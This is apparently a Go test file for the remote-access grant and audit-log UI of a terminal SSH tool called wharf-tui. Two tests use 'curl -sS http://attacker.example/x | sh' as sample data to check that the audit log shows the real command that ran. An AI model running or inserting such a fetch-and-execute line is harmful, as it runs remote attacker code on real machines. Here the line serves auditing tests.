//go:build !windows

package ui

import (
	"context"
	"errors"
	"io"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/Janne6565/wharf-tui/internal/remoteaccess"
	"github.com/Janne6565/wharf-tui/internal/sessd"
	"github.com/Janne6565/wharf-tui/internal/sshx"
	"github.com/Janne6565/wharf-tui/internal/store"
	tea "github.com/charmbracelet/bubbletea"
)

// grantedModel returns an unlocked real-mode model with one live session on
// "web1" and a recording clipboard hook, plus the recorder and the host. The
// grant is minted by pressing r, exactly as a user would.
func grantedModel(t *testing.T, copyErr error) (Model, *[]string, store.Host) {
	t.Helper()
	m, h := pickerModel(t, 1)
	var copies []string
	m.copyToClipboard = func(s string) error {
		copies = append(copies, s)
		return copyErr
	}
	next, _ := m.toggleRemoteAccess()
	got := next.(Model)
	if got.raGrant() == nil {
		t.Fatalf("pressing r on a connected host should mint a grant, raErr = %q", got.raErr)
	}
	t.Cleanup(got.ra.Revoke)
	return got, &copies, h
}

// holdGrant mints a grant in the model's holder, for the flows that revoke one
// without needing a session behind it. It goes through the Holder rather than
// remoteaccess.Open directly because the Holder is where the UI reads from: a
// grant the holder does not know about is not a state the UI can ever be in.
func holdGrant(t *testing.T, m Model, hostID, hostName string, ttl time.Duration) *remoteaccess.Grant {
	t.Helper()
	out, err := m.ra.Toggle(remoteaccess.Options{
		Exec: stubExec{}, HostID: hostID, HostName: hostName, TTL: ttl,
	})
	if err != nil {
		t.Fatalf("minting a grant on %s: %v", hostName, err)
	}
	// A nil error is not a grant: Toggle also reports a request that was
	// overtaken. Nothing overtakes a single-threaded fixture, so this is a
	// tripwire rather than a case to handle.
	if out.Grant == nil {
		t.Fatalf("minting a grant on %s produced no grant (%v)", hostName, out.Kind)
	}
	t.Cleanup(m.ra.Revoke)
	return out.Grant
}

// codeExec is an executor that reports a fixed exit code, so the audit log has
// something other than success to render.
type codeExec struct{ code int }

func (e codeExec) Exec(context.Context, sessd.ExecRequest, io.Writer, io.Writer) (int, error) {
	return e.code, nil
}

// raRuntimeDir points the grants directory at a private temp dir, so a test
// that dials a grant cannot find one belonging to another test — or another
// package's test binary running at the same time. /tmp rather than TMPDIR
// because a unix socket path is capped at ~100 bytes and macOS hands tests a
// far longer TMPDIR than that.
func raRuntimeDir(t *testing.T) {
	t.Helper()
	base, err := os.MkdirTemp("/tmp", "wh-ui-ra")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.RemoveAll(base) })
	t.Setenv("WHARF_RUNTIME_DIR", base)
}

func TestGrantingRemoteAccessMintsATokenAndShowsTheBadgeInTheHeader(t *testing.T) {
	m, copies, _ := grantedModel(t, nil)

	g := m.raGrant()
	line := g.CommandLine()
	if !strings.HasPrefix(line, "wharf --remote ") || !strings.Contains(line, g.Token()) {
		t.Fatalf("the command line should carry the token: %q", line)
	}
	if tok := g.Token(); len(tok) < 40 {
		t.Fatalf("a grant token should be 32 bytes of entropy, got %d chars", len(tok))
	}
	if len(*copies) != 1 || (*copies)[0] != line {
		t.Fatalf("granting should copy exactly the shown command line, copies = %v", *copies)
	}
	if ok, _ := m.raCopy.forGrant(g); !ok {
		t.Fatal("a clipboard hook that returned nil should be recorded as copied")
	}
	if !strings.Contains(m.View(), line) {
		t.Fatalf("the overlay should open on the command line:\n%s", m.View())
	}

	// The header badge lives under the overlay, so close it to read the bar.
	closed := send(m, special(tea.KeyEsc)).(Model)
	if !strings.Contains(closed.View(), "remote web1") {
		t.Fatalf("a live grant should show the header badge:\n%s", closed.View())
	}
}

// barLine drops the whole right-hand group when it overflows, so a chip that
// insisted on its full width would, at the common 80 columns, hide itself, the
// vault indicator and the lock hint all at once.
func TestTheBadgeStillFitsAtEightyColumns(t *testing.T) {
	tm, _ := openedModel(t)
	mm := tm.(Model)
	holdGrant(t, mm, "h1", "a-rather-long-hostname", 0)
	tm = send(mm, tea.WindowSizeMsg{Width: 80, Height: 32})

	view := tm.View()
	if !strings.Contains(view, "⚡") {
		t.Fatalf("the grant marker must survive at 80 columns:\n%s", view)
	}
	for _, want := range []string{"vault open", "q lock"} {
		if !strings.Contains(view, want) {
			t.Fatalf("the chip must not take %q down with it:\n%s", want, view)
		}
	}
	// Wide enough, and the host name comes back.
	wide := send(tm, tea.WindowSizeMsg{Width: 140, Height: 32})
	if !strings.Contains(wide.View(), "remote a-rather-long-hostname") {
		t.Fatalf("a wide terminal should name the host:\n%s", wide.View())
	}
}

func TestRevokingRemoteAccessClosesTheSocketAndHidesTheBadge(t *testing.T) {
	m, _, _ := grantedModel(t, nil)
	sock := m.raGrant().SocketPath()
	if _, err := os.Stat(sock); err != nil {
		t.Fatalf("a live grant should have a socket: %v", err)
	}
	m = send(m, special(tea.KeyEsc)).(Model) // leave the overlay, back on the hosts tab

	m = send(m, runes("r")).(Model) // toggle off
	if m.raGrant() != nil {
		t.Fatal("r on a live grant should revoke it")
	}
	if _, err := os.Stat(sock); !os.IsNotExist(err) {
		t.Fatalf("revocation is synchronous: the socket must be gone, stat err = %v", err)
	}
	if strings.Contains(m.View(), "remote web1") {
		t.Fatalf("the header badge must disappear with the grant:\n%s", m.View())
	}
}

// The audit log is rendered straight out of the Holder, so this drives it the
// way the real thing does — a client dials the grant and runs a command — and
// asserts on what the overlay shows. Nothing is injected into the UI at all:
// there is no longer any path by which an event could reach the log except
// through the grant that ran it.
func TestTheAuditLogRendersFromTheHolderWithTheLoginShellWrapperStripped(t *testing.T) {
	raRuntimeDir(t)
	tm, _ := openedModel(t)
	mm := tm.(Model)
	out, err := mm.ra.Toggle(remoteaccess.Options{
		Exec: codeExec{code: 3}, HostID: "h1", HostName: "web1",
	})
	if err != nil {
		t.Fatalf("minting a grant: %v", err)
	}
	t.Cleanup(mm.ra.Revoke)

	// Exactly what the client puts on the wire: the payload is wrapped in a
	// login shell and quoted once. A log that showed the wrapper instead of the
	// payload would render this indistinguishable from `uptime`.
	const script = "curl -sS http://attacker.example/x | sh"
	wire := `exec "${SHELL:-/bin/sh}" -lc ` + "'" + script + "'"

	code, err := remoteaccess.Dial(context.Background(), out.Grant.Token(),
		remoteaccess.Request{Command: wire}, io.Discard, io.Discard)
	if err != nil {
		t.Fatalf("running a command through the grant: %v", err)
	}
	if code != 3 {
		t.Fatalf("the remote exit code should come back verbatim, got %d", code)
	}

	log := mm.raLog()
	if len(log) != 1 {
		t.Fatalf("start and finish are one command and should be one row, log = %+v", log)
	}
	if !log[0].Finished || log[0].Code != 3 {
		t.Fatalf("the row should have flipped to its exit status, entry = %+v", log[0])
	}
	if log[0].HostName != "web1" {
		t.Fatalf("an entry has to name its own host, got %q", log[0].HostName)
	}

	view := send(mm, runes("A")).View()
	if !strings.Contains(view, script) {
		t.Errorf("the log must show the command that actually ran, in full:\n%s", view)
	}
	if strings.Contains(view, "${SHELL") {
		t.Errorf("the login-shell wrapper must not be shown in place of the payload:\n%s", view)
	}
	if !strings.Contains(view, "exit 3") {
		t.Errorf("the overlay log should show the exit status:\n%s", view)
	}
}

func TestLockingTheVaultRevokesTheGrant(t *testing.T) {
	tm, _ := openedModel(t)
	mm := tm.(Model)
	g := holdGrant(t, mm, "h1", "web1", 0)

	tm = send(mm, runes("q")) // q on the dashboard locks the vault
	got := tm.(Model)
	if got.screen != scUnlock {
		t.Fatalf("q should lock the vault, screen = %v", got.screen)
	}
	if got.raGrant() != nil {
		t.Fatal("locking must revoke the grant: a capability outliving a lock is exactly the hole locking is for")
	}
	if _, err := os.Stat(g.SocketPath()); !os.IsNotExist(err) {
		t.Fatalf("the grant socket must be gone after a lock, stat err = %v", err)
	}
}

// The TTL is enforced from the tick loop, because a grant minted while the
// program was suspended never had a timer armed for it.
func TestTheTTLExpiringRevokesTheGrant(t *testing.T) {
	tm, _ := openedModel(t)
	mm := tm.(Model)
	g := holdGrant(t, mm, "h1", "web1", time.Millisecond)

	// Not yet expired: the tick must leave a live grant alone.
	before := holdTick(mm)
	if before.raGrant() == nil {
		t.Fatal("a tick must not revoke a grant that is still within its TTL")
	}

	waitUntil(t, "the grant's TTL to lapse", g.Expired)
	got := holdTick(mm)
	if got.raGrant() != nil {
		t.Fatal("the TTL running out must revoke the grant")
	}
	if _, err := os.Stat(g.SocketPath()); !os.IsNotExist(err) {
		t.Fatalf("the grant socket must be gone after expiry, stat err = %v", err)
	}
	if !strings.Contains(got.View(), "expired") {
		t.Fatalf("expiry should be announced, not silent:\n%s", got.View())
	}
}

// holdTick advances the animation tick once, which is where the TTL is checked.
func holdTick(m Model) Model {
	next, _ := step(m, tickMsg{})
	return next.(Model)
}

// waitUntil polls cond so a slow machine costs patience rather than a flake.
func waitUntil(t *testing.T, what string, cond func() bool) {
	t.Helper()
	deadline := time.Now().Add(5 * time.Second)
	for time.Now().Before(deadline) {
		if cond() {
			return
		}
		time.Sleep(time.Millisecond)
	}
	t.Fatalf("timed out waiting for %s", what)
}

func TestTheGrantedSessionEndingRevokesTheGrant(t *testing.T) {
	tm, _ := openedModel(t)
	mm := tm.(Model)
	holdGrant(t, mm, "h1", "web1", 0)
	tm = mm

	// A different host's session ending leaves the grant alone.
	tm, _ = step(tm, sshx.SessionEndedMsg{HostID: "other"})
	if tm.(Model).raGrant() == nil {
		t.Fatal("an unrelated session ending must not revoke the grant")
	}

	tm, _ = step(tm, sshx.SessionEndedMsg{HostID: "h1"})
	got := tm.(Model)
	if got.raGrant() != nil {
		t.Fatal("the granted host's session ending must revoke the grant: a grant cannot outlive its connection")
	}
	if !strings.Contains(got.View(), "remote access revoked") {
		t.Fatalf("the session toast should say the capability went with it:\n%s", got.View())
	}
}

func TestTheOverlayShowsTheCommandWhenTheClipboardHookFails(t *testing.T) {
	m, copies, _ := grantedModel(t, errors.New("no tty"))

	if ok, _ := m.raCopy.forGrant(m.raGrant()); ok {
		t.Fatal("a failed clipboard write must never be recorded as copied")
	}
	if len(*copies) != 1 {
		t.Fatalf("the hook should still have been called once, copies = %v", *copies)
	}
	view := m.View()
	if !strings.Contains(view, m.raGrant().CommandLine()) {
		t.Fatalf("the command must always be selectable text — OSC 52 is silently dropped by some terminals:\n%s", view)
	}
	if strings.Contains(view, "✓ copied") {
		t.Fatalf("the overlay must not claim a copy that failed:\n%s", view)
	}
	if !strings.Contains(view, "not copied") {
		t.Fatalf("the overlay should say the copy did not happen:\n%s", view)
	}
}

// --- what the log says about where a command ran ----------------------------

// The log outlives the grant that produced it, and the in-session hotkey
// replaces grants as its normal behaviour, so rows from a previous host are the
// routine case. A row that did not name its host would be actively misleading
// at exactly that moment: the panel header says "granted on db1" while the row
// under it ran somewhere else entirely.
func TestTheLogNamesTheHostOfRowsThatDidNotRunOnTheLiveGrantsHost(t *testing.T) {
	raRuntimeDir(t)
	tm, _ := openedModel(t)
	mm := tm.(Model)
	t.Cleanup(mm.ra.Revoke)

	run := func(hostID, hostName, command string) {
		t.Helper()
		out, err := mm.ra.Toggle(remoteaccess.Options{
			Exec: stubExec{}, HostID: hostID, HostName: hostName,
		})
		if err != nil {
			t.Fatalf("minting a grant on %s: %v", hostName, err)
		}
		if _, err := remoteaccess.Dial(context.Background(), out.Grant.Token(),
			remoteaccess.Request{Command: command}, io.Discard, io.Discard); err != nil {
			t.Fatalf("running %q: %v", command, err)
		}
	}

	run("h1", "web1", "curl -sS http://attacker.example/x | sh")
	// Toggling on a second host replaces the grant and keeps the log.
	run("h2", "db1", "uptime")

	view := send(mm, runes("A")).View()
	if !strings.Contains(view, "on web1 · curl") {
		t.Fatalf("a row from a displaced host must name that host:\n%s", view)
	}
	if strings.Contains(view, "on db1 · uptime") {
		t.Fatalf("rows on the live grant's own host need no tag — it is named two lines above:\n%s", view)
	}

	// With the grant gone, nothing on screen says where any of it ran, so every
	// row is tagged.
	revoked := mm.revokeRemoteAccess()
	view = send(revoked.openRemoteAccess(), tea.WindowSizeMsg{Width: 100, Height: 40}).View()
	for _, want := range []string{"on web1 · curl", "on db1 · uptime"} {
		if !strings.Contains(view, want) {
			t.Fatalf("with no live grant every row must name its host, missing %q:\n%s", want, view)
		}
	}
}

// --- the overlay cursor -----------------------------------------------------

// The log grows at the front. An index-keyed cursor slides onto a different
// command every time a new one starts, which in an audit UI means the row you
// are reading — and about to revoke over — is not the row you selected.
func TestTheOverlayCursorStaysOnTheSameCommandAsNewOnesArrive(t *testing.T) {
	raRuntimeDir(t)
	tm, _ := openedModel(t)
	mm := tm.(Model)
	out, err := mm.ra.Toggle(remoteaccess.Options{Exec: stubExec{}, HostID: "h1", HostName: "web1"})
	if err != nil {
		t.Fatalf("minting a grant: %v", err)
	}
	t.Cleanup(mm.ra.Revoke)
	run := func(command string) {
		t.Helper()
		if _, err := remoteaccess.Dial(context.Background(), out.Grant.Token(),
			remoteaccess.Request{Command: command}, io.Discard, io.Discard); err != nil {
			t.Fatalf("running %q: %v", command, err)
		}
	}

	run("first")
	run("second")
	m := mm.openRemoteAccess()
	m = m.moveRemoteAccessCursor(1) // onto "first", the older of the two
	if got := m.raLog()[raCursor(m.raLog(), m.raSel)].Command; got != "first" {
		t.Fatalf("the cursor should be on %q, got %q", "first", got)
	}

	run("third")
	log := m.raLog()
	if log[0].Command != "third" {
		t.Fatalf("the newest command should be at the top, log = %+v", log)
	}
	if got := log[raCursor(log, m.raSel)].Command; got != "first" {
		t.Fatalf("the selection must stay on the command it was put on, got %q", got)
	}
}

// --- the overlay outliving the grant ----------------------------------------

// A TTL lapsing is exactly when someone is reading the log to see what ran, and
// the overlay is the only place the log is visible. It also covers the status
// bar, so the toast alone cannot explain the grant vanishing.
func TestTTLExpiryLeavesTheOverlayOpenAndSaysWhyTheGrantEnded(t *testing.T) {
	tm, _ := openedModel(t)
	mm := tm.(Model)
	g := holdGrant(t, mm, "h1", "web1", time.Millisecond)
	m := mm.openRemoteAccess()

	waitUntil(t, "the grant's TTL to lapse", g.Expired)
	got := holdTick(m)

	if got.modal != modalRemoteAccess {
		t.Fatal("expiry must not yank the overlay shut: the log is only readable here")
	}
	if !strings.Contains(got.View(), "the grant on web1 expired") {
		t.Fatalf("the overlay should say how the grant ended:\n%s", got.View())
	}
}

func TestAnExplicitRevokeInTheOverlayStillClosesIt(t *testing.T) {
	tm, _ := openedModel(t)
	mm := tm.(Model)
	holdGrant(t, mm, "h1", "web1", 0)
	m := mm.openRemoteAccess()

	next, _ := m.remoteAccessKey("x")
	got := next.(Model)
	if got.modal != modalNone {
		t.Fatal("x is the user asking to be done with the grant, so the panel closes")
	}
	if got.raGrant() != nil {
		t.Fatal("x must revoke")
	}
}

// A session that has since been connected must not be described by an error
// about it not being connected.
func TestTheInlineErrorDoesNotOutliveTheKeystrokeThatCausedIt(t *testing.T) {
	tm, _ := forwardModelWithHost(t) // real-mode model, one host, no pool at all
	tm = send(tm, runes("r"))
	if !strings.Contains(tm.(Model).raErr, "no live session") {
		t.Fatalf("r without a session should set an inline error, raErr = %q", tm.(Model).raErr)
	}

	tm = send(tm, runes("A"))
	got := tm.(Model)
	if got.raErr != "" {
		t.Fatalf("opening the overlay must clear a stale error, raErr = %q", got.raErr)
	}
	if strings.Contains(got.View(), "no live session") {
		t.Fatalf("the stale error must not reach the screen:\n%s", got.View())
	}
}
